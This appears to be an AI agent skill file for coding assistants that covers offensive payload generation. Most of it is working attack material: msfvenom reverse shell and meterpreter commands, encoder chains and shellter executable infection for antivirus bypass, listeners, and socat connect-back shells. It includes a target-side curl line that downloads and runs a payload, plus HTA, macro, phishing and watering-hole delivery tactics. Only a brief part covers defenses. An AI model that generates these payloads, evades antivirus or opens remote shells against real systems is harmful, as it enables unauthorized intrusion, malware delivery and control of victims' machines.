---
name: payload-generation
description: "Payload generation covers the creation, encoding, and delivery of shellcode and executable payloads for initial access and command-and-control (C2) communication."
origin: openclaw
version: "0.1.18"
compatibility:
  - openclaw
  - claude-code
  - cursor
  - windsurf
allowed-tools:
  - Bash
  - Read
  - Write
  - Edit
  - WebSearch
  - WebFetch
metadata:
  domain: exploitation
  tool_count: 7
  guide_count: 8
  mitre: "TA0007-Command and Control"
---




# Skill: Payload Generation

> **Supplementary Files**:
> - `payloads.md` — Complete payload collection organized by category: reverse shells (Bash/Python/PowerShell/Netcat), msfvenom formats, encoding chains, delivery mechanisms, listener setup, and shell stabilization
> - `test-cases.md` — 6 structured test cases covering reverse shell generation, staged vs stageless payloads, msfvenom encoding, shell stabilization, nishang PowerShell payloads, and socat encrypted shells

## Summary

Payload Generation skill domain covering exploitation operations.

**Tools**: msfvenom, netcat, socat, nishang, hoaxshell, rlwrap, shellter

**Domain**: exploitation

**MITRE ATT&CK**: TA0007-Command and Control

## Description

Payload generation covers the creation, encoding, and delivery of shellcode and executable payloads for initial access and command-and-control (C2) communication. This skill spans reverse shell generation across platforms (Linux, Windows, macOS), payload encoding for antivirus bypass, and delivery mechanism selection for reliable execution in target environments.

**Core Attack Surfaces**:

- **Reverse Shell Generation**: Creating connect-back payloads in multiple languages (Bash, Python, Perl, PowerShell, Netcat) for environments where specific interpreters are available or certain binaries are restricted.
- **Staged vs Stageless Payloads**: Choosing between meterpreter staged payloads (smaller stager, downloads second stage over network) and stageless payloads (self-contained, no network dependency for second stage but larger file size).
- **Encoding and Evasion**: Applying encoding transforms (shikata_ga_nai, multi-encoder chains) to modify payload signatures, injecting shellcode into legitimate executables with shellter, and using hoaxshell for encrypted C2 channels.
- **Delivery Mechanisms**: Web delivery (Python HTTP server, metasploit web_delivery), HTA applications, Office macro injection, DLL side-loading, and format-specific payloads (exe, dll, ps1, war, jsp).
- **Listener Setup and Shell Stabilization**: Configuring reliable listeners (netcat, socat, metasploit multi/handler), upgrading raw shells to interactive PTY sessions with rlwrap, and establishing encrypted tunnels with socat.

**Related Skills**:
- `skills/post-exploitation/SKILL.md` — Post-exploitation techniques after establishing shell access
- `skills/av-edr-evasion/SKILL.md` — Advanced AV/EDR bypass beyond basic encoding

---

## Use Cases

1. **Initial Access Shell Generation**: Generate platform-appropriate reverse shell payloads (Linux/Windows/macOS) during web application exploitation, command injection, or file upload vulnerabilities to establish interactive access.
2. **Cross-Platform Payload Creation**: Build payloads targeting specific OS and architecture combinations (Windows x64, Linux ARM, macOS x86) using msfvenom format selection and platform flags.
3. **AV Bypass Payload Preparation**: Encode payloads with multiple encoder iterations, inject shellcode into legitimate PE files using shellter, or use hoaxshell encrypted channels to evade signature-based detection.
4. **Red Team Delivery Package**: Create complete delivery packages including HTA droppers, macro-enabled documents, or DLL side-loading setups for social engineering campaigns or physical access scenarios.
5. **C2 Infrastructure Setup**: Configure robust listeners with automatic session handling, establish encrypted reverse shell tunnels, and stabilize shell sessions for reliable long-duration operations.

---

## Core Tools

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **msfvenom** | Payload generation for all platforms, encoders, formats, custom templates | `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf` |
| **netcat** | Listener setup, reverse shell execution, file transfer, port scanning | `nc -lvnp 4444` |
| **socat** | Encrypted shells, PTY shell stabilization, relay/tunneling | `socat OPENSSL-LISTEN:4443,cert=bind.pem,verify=0 FILE:`tty`,raw,echo=0` |
| **nishang** | PowerShell payloads for Windows: reverse shells, encoded commands, keyloggers | `Invoke-PowerShellTcp -Reverse -IPAddress 10.0.0.1 -Port 4444` |
| **hoaxshell** | Encrypted reverse shell using HTTPS, evades network monitoring | `hoaxshell -s -i 10.0.0.1 -p 4443 -t powershell` |
| **rlwrap** | Adds readline support (history, arrow keys) to raw shell sessions | `rlwrap nc -lvnp 4444` |
| **shellter** | PE file shellcode injection for AV bypass, infects legitimate executables | `shellter -i -f legit.exe -p 1 -lhost 10.0.0.1 -lport 4444` |

Auxiliary tools: **metasploit multi/handler** (listener for staged payloads), **metasploit web_delivery** (served payload delivery), **xinject** (cross-platform shellcode injection), **donut** (PE-to-shellcode conversion).

---

## Methodology

### Attack Chain

```
[1] Target Analysis      [2] Payload Generation   [3] Encoding
  - Platform (Win/Lin/Mac)  - msfvenom format select   - shikata_ga_nai
  - Architecture (x86/x64)  - Staged vs stageless       - Multi-encoder chains
  - Available interpreters  - Meterpreter vs raw shell   - Shellter PE injection
  - Network restrictions      |                            |
      v                       v                            v
[4] Delivery           [5] Listener Setup      [6] Shell Stabilize
  - Web delivery          - netcat basic listener    - rlwrap readline
  - HTA / macro           - socat encrypted tunnel   - PTY upgrade
  - DLL side-loading      - multi/handler staged     - socat encrypted shell
  - Physical media          |                         - Background/foreground
      v                       v
[7] Post-Exploitation
  - Privilege escalation
  - Lateral movement
  - Persistence
```

### Defense Perspective

| Defense Layer | Measures | Key Points |
|---------------|----------|------------|
| **Network Egress** | Outbound connection filtering, proxy enforcement, DNS monitoring | Block unknown outbound ports; require proxy for HTTP/HTTPS; monitor for reverse shell connection patterns (long-lived connections to unknown IPs) |
| **Endpoint Protection** | AV signature + behavioral detection, AMSI for PowerShell, application whitelisting | AMSI intercepts PowerShell payload decoding; behavioral engines flag process injection; AppLocker restricts unauthorized executables |
| **Email/Web Gateway** | Attachment sandboxing, macro blocking, HTA/OLE filtering | Strip macros from Office documents; block HTA/CHM/LNK attachments; sandbox executables before delivery |
| **Process Monitoring** | Parent-child process analysis, command-line auditing, network connection logging | Flag cmd.exe/powershell.exe spawned by unusual parents; audit full command lines; log all outbound network connections |

---

## Practical Steps

> **For detailed payloads see `payloads.md`, and for the complete test checklist see `test-cases.md`.** Below is a summary of core operations for each phase.

### 1. Target Analysis and Payload Selection

```bash
# Identify target platform and architecture
# Linux x64 reverse TCP shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf

# Windows x64 reverse TCP shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe

# Windows PowerShell reverse shell (no executable needed)
msfvenom -p windows/x64/powershell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f ps1 -o shell.ps1

# macOS reverse shell
msfvenom -p osx/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f macho -o shell.macho

# List all available payloads
msfvenom --list payloads | grep -i "reverse_tcp"
```

### 2. Staged vs Stageless Payload Selection

```bash
# Staged (smaller, downloads second stage) — format: <platform>/<arch>/meterpreter/reverse_tcp
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o staged.exe

# Stageless (self-contained, no second stage download) — format: .../meterpreter_reverse_tcp
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o stageless.exe

# Compare sizes
ls -la staged.exe stageless.exe
# staged.exe: ~15KB    stageless.exe: ~200KB+
```

### 3. Encoding for AV Bypass

```bash
# Single encoder, 5 iterations
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x64/shikata_ga_nai -i 5 -f exe -o encoded.exe

# Multi-encoder chain
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x64/shikata_ga_nai -i 3 -f raw | \
  msfvenom -p - -e x64/zutto_dekiru -i 3 -f exe -o multi_encoded.exe

# Shellter PE injection into legitimate executable
shellter -i -f /usr/share/windows-binaries/plink.exe -p 1 -lhost 10.0.0.1 -lport 4444
```

### 4. Listener Setup

```bash
# Basic netcat listener
nc -lvnp 4444

# rlwrap for readline support (history, arrow keys)
rlwrap nc -lvnp 4444

# socat encrypted listener (requires certificate)
openssl req -newkey rsa:2048 -nodes -keyout bind.key -x509 -days 365 -out bind.crt
cat bind.key bind.crt > bind.pem
socat OPENSSL-LISTEN:4443,cert=bind.pem,verify=0 FILE:`tty`,raw,echo=0

# Metasploit multi/handler for staged payloads
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.1; set LPORT 4444; exploit"
```

### 5. Shell Stabilization

```bash
# After receiving raw reverse shell on Linux:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z to background
stty raw -echo; fg
# Press Enter twice
export TERM=xterm

# Alternative: use socat for PTY shell from the start
# On attacker (listener):
socat TCP-LISTEN:4444,reuseaddr,fork FILE:`tty`,raw,echo=0
# On target:
socat TCP:10.0.0.1:4444 EXEC:'bash -li',pty,stderr,setsid,sigint,sane
```

### 6. Delivery Mechanisms

```bash
# Web delivery — serve payload via Python HTTP server
python3 -m http.server 8080
# Target downloads: curl http://10.0.0.1:8080/shell.elf -o /tmp/shell.elf && chmod +x /tmp/shell.elf && /tmp/shell.elf

# Metasploit web_delivery (no file on disk)
msfconsole -x "use exploit/multi/script/web_delivery; set TARGET 7; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.1; set LPORT 4444; exploit"
# Generates PowerShell one-liner for target execution

# HTA delivery (Internet Explorer / mshta.exe)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f hta-psh -o evil.hta
```

## Payload Encoding Strategies

Encoding transforms shellcode bytes to avoid specific byte sequences (bad characters), bypass signature-based detection, and adapt payloads for restrictive delivery channels. Understanding when and how to apply encoding is critical for successful payload delivery.

### Encoding Decision Matrix

| Scenario | Recommended Approach | Rationale |
|----------|---------------------|-----------|
| Known bad characters (exploit dev) | `-b '\x00\x0a\x0d'` with msfvenom | Removes specific bytes that break exploitation |
| Basic AV bypass | shikata_ga_nai x3-5 iterations | Polymorphic output varies each generation |
| Advanced AV bypass | Shellter PE injection | Injects into legitimate executable at assembly level |
| Network signature evasion | Multi-encoder chain (3+ encoders) | Multiple transformations defeat single-pattern signatures |
| PowerShell AMSI bypass | Custom AMSI bypass + encoding | AMSI intercepts decoded content at runtime |
| Memory-only execution | Web delivery + hoaxshell HTTPS | No file artifacts for signature scanning |

### Encoding Trade-offs

Higher encoding iteration counts increase payload size and may trigger behavioral heuristics that flag polymorphic code patterns. A 5-iteration shikata_ga_nai encoding produces a larger payload than a single iteration, and the decoder stub itself can become a detection signature. Multi-encoder chains (applying different encoding algorithms sequentially) are more effective than high iterations of a single encoder because each encoder produces a different transformation pattern.

## Staged vs Stageless Payload Selection

Choosing between staged and stageless payloads is one of the most consequential decisions in payload generation. The wrong choice results in silent failures that are difficult to diagnose during engagements.

### Selection Criteria

| Condition | Choose Staged | Choose Stageless |
|-----------|--------------|------------------|
| Strict egress filtering | No | Yes (no second download needed) |
| Network proxy inspection | No | Yes (single connection) |
| Need for meterpreter features | Yes | Yes |
| Target has limited bandwidth | Yes (smaller initial download) | No |
| Listener flexibility needed | No (requires multi/handler) | Yes (any TCP listener) |
| Maximum stealth needed | Yes (smaller signature surface) | No (full payload visible) |
| Unreliable network conditions | No | Yes (self-contained) |
| Need for AV evasion | Yes (less code to detect) | No (more code to analyze) |

### Hybrid Approach

For engagements where both reliability and stealth are needed, generate both staged and stageless payloads targeting the same LHOST/LPORT. Deploy the staged payload as the primary vector (smaller, less detectable) and fall back to the stageless payload if the second stage download fails due to network restrictions.

```bash
# Generate both variants with matching parameters
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o staged.exe
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o stageless.exe

# Set up multi/handler that can catch both
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.1; set LPORT 4444; set ExitOnSession false; exploit -j"
```

## Payload Delivery Methods

The delivery method determines how the payload reaches the target system. Selecting the right delivery method requires understanding the target environment, the available attack vectors, and the defensive controls in place.

### Delivery Method Comparison

| Method | Target Interaction | Stealth | AV Evasion | Prerequisites |
|--------|-------------------|---------|------------|---------------|
| HTTP download (curl/wget) | Low (command execution) | Low | Low | Web access, command execution |
| PowerShell web delivery | Low (one-liner) | Medium | Medium | PowerShell available |
| HTA (mshta.exe) | Medium (user opens link) | Medium | Medium | User interaction, mshta available |
| Office macro | High (user opens document) | Medium | Medium | Macros enabled, Office installed |
| DLL side-loading | Low (application start) | High | High | Target application identified |
| Physical media (USB) | High (physical insertion) | High | High | Physical access |
| Phishing email | High (user opens attachment) | Medium | Medium | Email infrastructure |
| Watering hole | High (user visits site) | High | High | Compromised web server |

### Delivery Reliability Best Practices

1. Always test the delivery chain end-to-end before the engagement. A payload that works in the lab but fails on the target wastes time and may alert defenders.
2. Have multiple delivery methods prepared. If the primary method is blocked, immediately switch to the backup without re-generating payloads.
3. Match the delivery method to the target's daily workflow. A malicious macro in a financial spreadsheet is more convincing than a generic HTA download.
4. Consider the forensic artifacts each method leaves. HTA files create temporary files on disk. PowerShell web delivery may be logged in event logs. Memory-only delivery (hoaxshell) leaves fewer artifacts.

## Automation and Scripting

Payload generation benefits from scripting to automate the build-test-refine cycle. Wrapper scripts around msfvenom can iterate through payload types, encoders, and iteration counts to find combinations that bypass specific AV products. Automated listener management scripts can spin up multi/handler instances with predefined resource scripts, enabling rapid testing of multiple payload variants. For red team operations, building a payload generation pipeline that produces multiple formats (exe, dll, ps1, hta, macro) from a single configuration ensures consistent LHOST/LPORT/encoder settings across all deliverables.

## Common Pitfalls

A frequent mistake is selecting staged payloads without a corresponding multi/handler listener — staged payloads will fail silently because the second stage has nowhere to connect. Another pitfall is neglecting shell stabilization: raw reverse shells drop on accidental Ctrl+C and lack tab completion, making post-exploitation work error-prone. Always stabilize immediately after catching a shell. For encoding, relying solely on shikata_ga_nai with high iteration counts rarely bypasses modern AV — consider shellter injection or custom loaders instead. Finally, failing to match payload architecture to the target (e.g., x86 payload on x64 target) results in crashes or silent failures.

## Detection Methods

Reverse shells are detected through multiple overlapping indicators: network-level detection monitors for long-lived outbound connections to unknown IPs, especially on non-standard ports. Process-level detection flags cmd.exe or powershell.exe spawned by unusual parent processes (e.g., word.exe, mshta.exe). Host-based IDS monitors for process injection patterns and unexpected network socket creation. Behavioral analysis catches encoded PowerShell commands decoded at runtime via AMSI. Network IDS signatures match known meterpreter handshake patterns and common shell connection sequences.

---

## Hacker Laws

- **Know Your Target**: Payload selection must match the target platform, architecture, and available interpreters. A PowerShell payload is useless against a Linux target; an ELF binary will not execute on Windows. Reconnaissance determines payload viability.
- **Defense in Depth Applies to Attackers**: Layer encoding (shikata_ga_nai chains), injection (shellter PE), and delivery (HTA rather than raw exe) to increase the probability of bypassing multiple defense layers. Single-layer evasion fails against defense-in-depth.
- **Fail Gracefully**: Always have a fallback delivery method. If the primary payload is detected, the secondary encoding or alternative format should still succeed. Stageless payloads serve as fallback when staged delivery fails.

---

## Learning Resources

**Supplementary files for this skill**:
- `payloads.md` — Complete payload collection (reverse shells, msfvenom commands, encoding chains, delivery techniques, listener configuration)
- `test-cases.md` — Structured test cases (6 cases covering all core payload generation scenarios)

**Workspace guides**:
- `guides/reverse-shell-complete-guide.md` — Complete reverse shell reference for Linux and Windows with listener setup and stabilization
- `guides/msfvenom-payload-generation-guide.md` — msfvenom deep dive covering format selection, encoder chaining, and custom templates
- `guides/payload-delivery-evasion-guide.md` — Delivery techniques and AV bypass strategies including shellter and hoaxshell
- `guides/cross-platform-payload-guide.md` — Cross-platform payload generation for Windows/Linux/macOS, architecture considerations (x86/x64/ARM64), cross-compilation
- `guides/web-shell-generation-guide.md` — Web shell generation (PHP, ASP, JSP, Python), obfuscation, detection avoidance, one-liner shells
- `guides/payload-encoding-encryption-guide.md` — Encoding layers (shikata_ga_nai, XOR, base64), AES encryption, custom encoders, entropy analysis

**Related skills**:
- `skills/post-exploitation/SKILL.md` — Post-exploitation techniques after shell establishment
- `skills/av-edr-evasion/SKILL.md` — Advanced AV/EDR bypass techniques

**External resources**:
- **Reverse Shell Cheat Sheet (PentestMonkey)**: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- **msfvenom Documentation**: https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html
- **Nishang GitHub**: https://github.com/samratashok/nishang
- **HoaxShell GitHub**: https://github.com/t3l3machus/hoaxshell
- **Shellter GitHub**: https://www.shellterproject.com/
- **HackTricks - Shells**: https://book.hacktricks.xyz/generic-methodologies-and-resources/shells
